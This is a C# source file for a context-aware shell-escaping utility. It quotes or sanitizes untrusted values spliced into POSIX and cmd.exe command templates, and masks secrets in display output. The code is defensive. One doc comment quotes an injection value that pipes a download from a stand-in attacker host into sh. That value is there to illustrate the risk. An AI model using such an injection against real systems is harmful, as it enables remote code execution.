using System.Text;
using System.Runtime.InteropServices;

namespace Menuki.Engine;

/// <summary>
/// Makes user/agent-supplied values safe to splice into a <c>command_template</c>.
///
/// A template is trusted (it comes from the config), but the values substituted into its
/// <c>{placeholders}</c> are not: without escaping, a value like <c>$(curl attacker|sh)</c>
/// would be evaluated by the shell - a full RCE. The tricky part is that a placeholder may
/// sit in different shell-quoting contexts, and each needs different escaping:
///
///   ssh deploy@{host}            (unquoted)      -> value wrapped in '...'
///   git commit -m "{msg}"        (double-quoted) -> $, `, \, " backslash-escaped in place
///   echo 'deploying to {env}'    (single-quoted) -> ' rewritten as '\'' in place
///
/// So instead of a single blind quoting, the interpolation scans the template, tracks the
/// quoting context at each placeholder, and escapes each value for exactly that context. In
/// every case the value ends up as inert, literal text - metacharacters are never executed.
/// (Windows <c>cmd.exe</c> quoting is inherently lossy; there the value is sanitized of the
/// characters that could trigger command chaining or variable expansion.)
/// </summary>
public static class ShellEscaper
{
    private enum Ctx { None, Single, Double }

    /// <summary>
    /// Substitute <c>{name}</c> placeholders in <paramref name="template"/> with their
    /// context-escaped values. The only safe way to build a runnable command from untrusted
    /// input.
    /// </summary>
    public static string Interpolate(string template, IReadOnlyDictionary<string, string> values) =>
        RuntimeInformation.IsOSPlatform(OSPlatform.Windows)
            ? InterpolateWindows(template, values, secretNames: null)
            : InterpolatePosix(template, values, secretNames: null);

    /// <summary>
    /// Like <see cref="Interpolate"/> but for display/logging: values whose name is in
    /// <paramref name="secretNames"/> are shown as <c>***</c> instead of their real value,
    /// so secrets never reach the console or the headless JSON output.
    /// </summary>
    public static string InterpolateForDisplay(
        string template, IReadOnlyDictionary<string, string> values, ISet<string> secretNames) =>
        RuntimeInformation.IsOSPlatform(OSPlatform.Windows)
            ? InterpolateWindows(template, values, secretNames)
            : InterpolatePosix(template, values, secretNames);

    /// <summary>POSIX single-quote a value for an unquoted context: wrap in <c>'...'</c>
    /// and encode any embedded quote as <c>'\''</c>. Exposed for testing.</summary>
    public static string QuotePosix(string value) =>
        "'" + value.Replace("'", "'\\''") + "'";

    /// <summary>Best-effort quoting for <c>cmd.exe</c> in an unquoted context. Exposed for testing.</summary>
    public static string QuoteWindows(string value) =>
        "\"" + SanitizeWindows(value).Replace("\"", "\"\"") + "\"";

    // --- POSIX context-aware interpolation -------------------------------------------------

    private static string InterpolatePosix(
        string template, IReadOnlyDictionary<string, string> values, ISet<string>? secretNames)
    {
        var sb = new StringBuilder(template.Length + 16);
        var ctx = Ctx.None;

        for (var i = 0; i < template.Length; i++)
        {
            var c = template[i];

            if (c == '{' && TryReadPlaceholder(template, i, values, out var name, out var end))
            {
                if (secretNames != null && secretNames.Contains(name))
                    sb.Append("***");
                else
                    sb.Append(EscapePosix(values[name], ctx));
                i = end; // skip past the closing '}'
                continue;
            }

            // Inside double quotes a backslash escapes the next character; copy the pair
            // verbatim so a template's own "\"" or "\$" is not misread as a quote toggle.
            if (ctx == Ctx.Double && c == '\\' && i + 1 < template.Length)
            {
                sb.Append(c).Append(template[i + 1]);
                i++;
                continue;
            }

            switch (c)
            {
                case '\'' when ctx == Ctx.None: ctx = Ctx.Single; break;
                case '\'' when ctx == Ctx.Single: ctx = Ctx.None; break;
                case '"' when ctx == Ctx.None: ctx = Ctx.Double; break;
                case '"' when ctx == Ctx.Double: ctx = Ctx.None; break;
            }

            sb.Append(c);
        }

        return sb.ToString();
    }

    private static string EscapePosix(string value, Ctx ctx) => ctx switch
    {
        // Unquoted: wrap the whole value so every metacharacter is inert.
        Ctx.None => QuotePosix(value),
        // Already inside '...': only a single quote can break out; rewrite it as '\''.
        Ctx.Single => value.Replace("'", "'\\''"),
        // Already inside "...": neutralize the characters the shell still acts on.
        Ctx.Double => value
            .Replace("\\", "\\\\")
            .Replace("`", "\\`")
            .Replace("$", "\\$")
            .Replace("\"", "\\\""),
        _ => QuotePosix(value)
    };

    // --- Windows best-effort interpolation -------------------------------------------------

    private static string InterpolateWindows(
        string template, IReadOnlyDictionary<string, string> values, ISet<string>? secretNames)
    {
        var sb = new StringBuilder(template.Length + 16);
        for (var i = 0; i < template.Length; i++)
        {
            var c = template[i];
            if (c == '{' && TryReadPlaceholder(template, i, values, out var name, out var end))
            {
                sb.Append(secretNames != null && secretNames.Contains(name)
                    ? "***"
                    : SanitizeWindows(values[name]));
                i = end;
                continue;
            }
            sb.Append(c);
        }
        return sb.ToString();
    }

    /// <summary>
    /// Strip the characters cmd.exe uses to chain commands or expand variables. cmd quoting
    /// cannot be made fully robust, so dangerous characters are removed rather than escaped.
    /// </summary>
    private static string SanitizeWindows(string value)
    {
        var sb = new StringBuilder(value.Length);
        foreach (var c in value)
            if (c is not ('&' or '|' or '<' or '>' or '^' or '%' or '!'))
                sb.Append(c);
        return sb.ToString();
    }

    // --- shared placeholder scanner --------------------------------------------------------

    /// <summary>
    /// If <paramref name="template"/> has a <c>{name}</c> placeholder starting at
    /// <paramref name="start"/> whose name is a key of <paramref name="values"/>, return its
    /// name and the index of the closing brace. Unknown names are left as literal text.
    /// </summary>
    private static bool TryReadPlaceholder(
        string template, int start, IReadOnlyDictionary<string, string> values,
        out string name, out int end)
    {
        name = "";
        end = start;

        var j = start + 1;
        while (j < template.Length && (char.IsLetterOrDigit(template[j]) || template[j] == '_'))
            j++;

        if (j == start + 1 || j >= template.Length || template[j] != '}')
            return false;

        var candidate = template.Substring(start + 1, j - start - 1);
        if (!values.ContainsKey(candidate))
            return false;

        name = candidate;
        end = j;
        return true;
    }
}
